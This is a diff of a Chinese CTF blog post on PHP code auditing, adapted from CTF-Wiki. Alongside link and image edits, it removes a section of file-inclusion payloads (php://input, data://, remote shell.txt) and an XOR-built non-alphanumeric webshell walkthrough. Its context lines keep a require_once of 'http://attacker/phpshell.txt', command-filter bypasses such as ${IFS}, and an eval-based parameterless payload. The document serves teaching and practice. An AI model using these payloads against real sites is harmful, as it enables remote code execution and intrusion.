@@ -2,7 +2,7 @@
 title: PHP代码审计
 date: 2025-11-08 21:59:32
 tags:
-index_img: https://pic1.imgdb.cn/item/690c233e3203f7be00db6444.png
+index_img: https://gitee.com/bobrocket/img/raw/master/img/690c233e3203f7be00db6444.png
 categories: CTF
 ---
 
@@ -103,10 +103,6 @@ if (file_exists('/home/wwwrun/'.$file.'.php')) {
 
   Linux 需要文件名长于 4096，Windows 需要长于 256。
 
-[本地文件包含漏洞详解与CTF实战 ](https://www.cnblogs.com/xinghaihe/p/18416524)
-
-[伪协议过滤绕过](/html/taishan.html)
-
 #### 远程文件包含
 
 ```php
@@ -134,48 +130,11 @@ require_once "http://attacker/phpshell.txt?/action/m_share.php";
 
 ![](https://pic1.imgdb.cn/item/693d6f5ffe7cfeca3822eec5.png)
 
-- 普通远程文件包含
-
-  ```
-  ?file=[http|https|ftp]://example.com/shell.txt
-  ```
-
-  需要 `allow_url_fopen=On` 并且 `allow_url_include=On` 。
-
-- 利用 PHP 流 input
-
-  ```
-  ?file=php://input
-  ```
-
-  需要 `allow_url_include=On` 。
-
-- 利用 PHP 流 filter
-
-  ```
-  ?file=php://filter/convert.base64-encode/resource=index.php
-  ```
-
-  需要 `allow_url_include=On` 。
-
-- 利用 data URIs
-
-  ```
-  ?file=data://text/plain;base64,SSBsb3ZlIFBIUAo=
-  ```
-
-  需要 `allow_url_include=On` 。
-
-- 利用 XSS 执行
-
-  ```
-  ?file=http://127.0.0.1/path/xss.php?xss=phpcode
-  ```
-
-  需要 `allow_url_fopen=On`，`allow_url_include=On` 并且防火墙或者白名单不允许访问外网时，先在同站点找一个 XSS 漏洞，包含这个页面，就可以注入恶意代码了。
-  
-
 [**PHP伪协议详解**](https://konwait12.github.io/my-kon-blog/posts/php%E4%BC%AA%E5%8D%8F%E8%AE%AE/)
+
+[本地文件包含漏洞详解与CTF实战 ](https://www.cnblogs.com/xinghaihe/p/18416524)
+
+[伪协议过滤绕过](/html/taishan.html)
 
 
 
@@ -197,6 +156,8 @@ pcntl_exec();
 ......
 ```
 
+[CTF里读取文件相关知识点总结(持续更新中) – fushulingのblog](https://fushuling.com/index.php/2023/04/14/ctf里读取文件相关知识点总结/)
+
 ### `preg_replace()` 代码执行
 
 `preg_replace()` 的第一个参数如果存在 `/e` 模式修饰符，则允许代码执行。
@@ -214,128 +175,6 @@ preg_replace("/<tag>(.*?)<\/tag>/e", "addslashes(\\1)", $var);
 
 `preg_match` 执行的是匹配正则表达式，如果匹配成功，则允许代码执行。
 
-```
-<?php
-include 'flag.php';
-if(isset($_GET['code'])){
-    $code = $_GET['code'];
-    if(strlen($code)>40){
-        die("Long.");
-    }
-    if(preg_match("/[A-Za-z0-9]+/",$code)){
-        die("NO.");
-    }
-    @eval($code);
-}else{
-    highlight_file(__FILE__);
-}
-//$hint =  "php function getFlag() to get flag";
-?>
-```
-
-<details>
-<summary>点击这里展开详细内容</summary>
-<p>这道题是 <code>xman</code> 训练赛的时候，梅子酒师傅出的一道题。这一串代码描述是这样子，我们要绕过 <code>A-Z</code>、<code>a-z</code>、<code>0-9</code> 这些常规数字、字母字符串的传参，将非字母、数字的字符经过各种变换，最后能构造出 <code>a-z</code> 中任意一个字符，并且字符串长度小于 <code>40</code> 。然后再利用 <code>PHP</code> 允许动态函数执行的特点，拼接出一个函数名，这里我们是 <code>getFlag</code>，然后动态执行该代码即可。</p>
-<p>那么，我们需要考虑的问题是如何通过各种变换，使得我们能够去成功读取到 <code>getFlag</code> 函数，然后拿到 <code>webshell</code> 。</p>
-<p>在理解这个之前，我们首先需要大家了解的是 <code>PHP</code> 中异或 <code>^</code> 的概念。</p>
-<p>我们先看一下下面这段代码：</p>
-<pre><code>&lt;?php
-    echo &quot;A&quot;^&quot;?&quot;;
-?&gt;
-</code></pre>
-<p>运行结果如下：</p>
-<p><img src="https://ctf-wiki.org/web/php/figure/preg_match/answer1.png"></p>
-<p>我们可以看到，输出的结果是字符 <code>~</code>。之所以会得到这样的结果，是因为代码中对字符 <code>A</code> 和字符 <code>?</code> 进行了异或操作。在 <code>PHP</code> 中，两个变量进行异或时，先会将字符串转换成 <code>ASCII</code> 值，再将 <code>ASCII</code> 值转换成二进制再进行异或，异或完，又将结果从二进制转换成了 <code>ASCII</code> 值，再将 <code>ASCII</code> 值转换成字符串。异或操作有时也被用来交换两个变量的值。</p>
-<p>比如像上面这个例子</p>
-<p><code>A</code> 的 <code>ASCII</code> 值是 <code>65</code> ，对应的二进制值是 <code>01000001</code></p>
-<p><code>?</code> 的ASCII值是 <code>63</code> ，对应的二进制值是 <code>00111111</code></p>
-<p>异或的二进制的值是 <code>‭01111110‬</code> ，对应的 <code>ASCII</code> 值是 <code>126</code> ，对应的字符串的值就是 <code>~</code> 了</p>
-<p>我们都知道， <code>PHP</code> 是弱类型的语言，也就是说在 <code>PHP</code> 中我们可以不预先声明变量的类型，而直接声明一个变量并进行初始化或赋值操作。正是由于 <code>PHP</code> 弱类型的这个特点，我们对 <code>PHP</code> 的变量类型进行隐式的转换，并利用这个特点进行一些非常规的操作。如将整型转换成字符串型，将布尔型当作整型，或者将字符串当作函数来处理，下面我们来看一段代码：</p>
-<pre><code>&lt;?php
-    function B(){
-        echo &quot;Hello Angel_Kitty&quot;;
-    }
-    $_++;
-    $__= &quot;?&quot; ^ &quot;}&quot;;
-    $__();
-?&gt;
-</code></pre>
-<p>代码执行结果如下：</p>
-<p><img src="https://ctf-wiki.org/web/php/figure/preg_match/answer2.png"></p>
-<p>我们一起来分析一下上面这段代码：</p>
-<p>1、<code>$_++;</code> 这行代码的意思是对变量名为 <code>&quot;_&quot;</code> 的变量进行自增操作，在 <code>PHP</code> 中未定义的变量默认值 <code>null</code> ，<code>null==false==0</code> ，我们可以在不使用任何数字的情况下，通过对未定义变量的自增操作来得到一个数字。</p>
-<p>2、<code>$__=&quot;?&quot; ^ &quot;}&quot;;</code> 对字符 <code>?</code> 和 <code>}</code> 进行异或运算，得到结果 <code>B</code> 赋给变量名为 <code>__</code> (两个下划线)的变量</p>
-<p>3、<code>$ __ ();</code> 通过上面的赋值操作，变量 <code>$__</code> 的值为 <code>B</code> ，所以这行可以看作是 <code>B()</code> ，在 <code>PHP</code> 中，这行代码表示调用函数 <code>B</code> ，所以执行结果为 <code>Hello Angel_Kitty</code> 。在 <code>PHP</code> 中，我们可以将字符串当作函数来处理。</p>
-<p>看到这里，相信大家如果再看到类似的 <code>PHP</code> 后门应该不会那么迷惑了，你可以通过一句句的分析后门代码来理解后门想实现的功能。</p>
-<p>我们希望使用这种后门创建一些可以绕过检测的并且对我们有用的字符串，如 <code>_POST</code> ， <code>system</code> ， <code>call_user_func_array</code>，或者是任何我们需要的东西。</p>
-<p>下面是个非常简单的非数字字母的 <code>PHP</code> 后门：</p>
-<pre><code>&lt;?php
-    @$_++; // $_ = 1
-    $__=(&quot;#&quot;^&quot;|&quot;); // $__ = _
-    $__.=(&quot;.&quot;^&quot;~&quot;); // _P
-    $__.=(&quot;/&quot;^&quot;`&quot;); // _PO
-    $__.=(&quot;|&quot;^&quot;/&quot;); // _POS
-    $__.=(&quot;{&quot;^&quot;/&quot;); // _POST 
-    ${$__}[!$_](${$__}[$_]); // $_POST[0]($_POST[1]);
-?&gt;
-</code></pre>
-<p>在这里我说明下， <code>.=</code> 是字符串的连接，具体参看 <code>PHP</code> 语法</p>
-<p>我们甚至可以将上面的代码合并为一行，从而使程序的可读性更差，代码如下：</p>
-<pre><code>$__=(&quot;#&quot;^&quot;|&quot;).(&quot;.&quot;^&quot;~&quot;).(&quot;/&quot;^&quot;`&quot;).(&quot;|&quot;^&quot;/&quot;).(&quot;{&quot;^&quot;/&quot;);
-</code></pre>
-<p>我们回到 <code>xman</code> 训练赛的那题来看，我们的想法是通过构造异或来去绕过那串字符，那么我们该如何构造这个字串使得长度小于 <code>40</code> 呢？</p>
-<p>我们最终是要读取到那个 <code>getFlag</code> 函数，我们需要构造一个 <code>_GET</code> 来去读取这个函数，我们最终构造了如下字符串：</p>
-<p><img src="https://ctf-wiki.org/web/php/figure/preg_match/payloads.png"></p>
-<p>可能很多小伙伴看到这里仍然无法理解这段字符串是如何构造的吧，我们就对这段字符串进行段分析。</p>
-<h4>构造 <code>_GET</code> 读取</h4>
-<p>首先我们得知道 <code>_GET</code> 由什么异或而来的，经过我的尝试与分析，我得出了下面的结论：</p>
-<pre><code>&lt;?php
-    echo &quot;`{{{&quot;^&quot;?&lt;&gt;/&quot;;//_GET
-?&gt;
-</code></pre>
-<p>这段代码一大坨是啥意思呢？因为40个字符长度的限制，导致以前逐个字符异或拼接的webshell不能使用。<br/>这里可以使用php中可以执行命令的反引号 <code>`</code> 和 <code>Linux</code> 下面的通配符 <code>?</code></p>
-<ul>
-<li><code>?</code> 代表匹配一个字符</li>
-<li><code>`</code> 表示执行命令</li>
-<li><code>&quot;</code> 对特殊字符串进行解析</li>
-    <p>由于 <code>?</code> 只能匹配一个字符，这种写法的意思是循环调用，分别匹配。我们将其进行分解来看：</p>
-<pre><code>&lt;?php
-    echo &quot;{&quot;^&quot;&lt;&quot;;
-?&gt;
-</code></pre>
-<p>输出结果为：</p>
-<p><img src="https://ctf-wiki.org/web/php/figure/preg_match/answer3.png"></p>
-<pre><code>&lt;?php
-    echo &quot;{&quot;^&quot;&gt;&quot;;
-?&gt;
-</code></pre>
-<p>输出结果为：</p>
-<p><img src="https://ctf-wiki.org/web/php/figure/preg_match/answer4.png"></p>
-<pre><code>&lt;?php
-    echo &quot;{&quot;^&quot;/&quot;;
-?&gt;
-</code></pre>
-<p>输出结果为：</p>
-<p><img src="https://ctf-wiki.org/web/php/figure/preg_match/answer5.png"></p>
-<p>所以我们可以知道， <code>_GET</code> 就是这么被构造出来的啦！</p>
-<h4>获取 <code>_GET</code> 参数</h4>
-<p>我们又该如何获取 <code>_GET</code> 参数呢？咱们可以构造出如下字串：</p>
-<pre><code>&lt;?php
-    echo ${$_}[_](${$_}[__]);//$_GET[_]($_GET[__])
-?&gt;
-</code></pre>
-<p>根据前面构造的来看， <code>$_</code> 已经变成了 <code>_GET</code> 。顺理成章的来讲， <code>$_ = _GET</code> 。我们构建 <code>$_GET[__]</code> 是为了要获取参数值。</p>
-<h4>传入参数</h4>
-<p>此时我们只需要去调用 <code>getFlag</code> 函数获取 <code>webshell</code> 就好了，构造如下：</p>
-<pre><code>&lt;?php
-    echo $_=getFlag;//getFlag
-?&gt;
-</code></pre>
-<p>所以把参数全部连接起来，就可以了。</p>
-<p><img src="https://ctf-wiki.org/web/php/figure/preg_match/payloads.png"></p>
-<p>结果如下：</p>
-<p><img src="https://ctf-wiki.org/web/php/figure/preg_match/flag.png"></p>
-<p>于是我们就成功地读取到了flag！</p></details>
 
 
 
@@ -393,7 +232,7 @@ http://www.a.com/index.php?callback=phpinfo
 
 ### 反序列化
 
-咕咕咕~
+[在这儿呢](https://www.sunynov.top/2025/12/24/PHP反序列化漏洞/)
 
 
 
@@ -554,15 +393,16 @@ var_dump(in_array('1bc', $array)); //true
 
 - `tac` 是一个常用的文本处理命令，核心功能是 **反向输出文件内容**
 - `more` 命令是 Linux 系统中用于分页显示文件内容的工具，在处理篇幅较长的文本文件时非常实用
-- `less，tail，head`
+- `less,tail,head`
+- `uniq,nl,vi,vim`
 
 ##### 空格绕过
 
 <、>、${IFS}、$IFS、$IFS$9
 
-[CTF中的命令执行绕过方式](https://blog.csdn.net/2401_84466223/article/details/139408099)
+#### php
 
-#### php命令
+无参🐎
 
 ```
 code=eval(array_pop(next(get_defined_vars())));&1=phpinfo();
@@ -571,4 +411,3 @@ code=eval(array_pop(next(get_defined_vars())));&1=phpinfo();
 
 
 <p class="note note-success">本文摘自CTF-Wiki，原文基础上有改动</p>
-
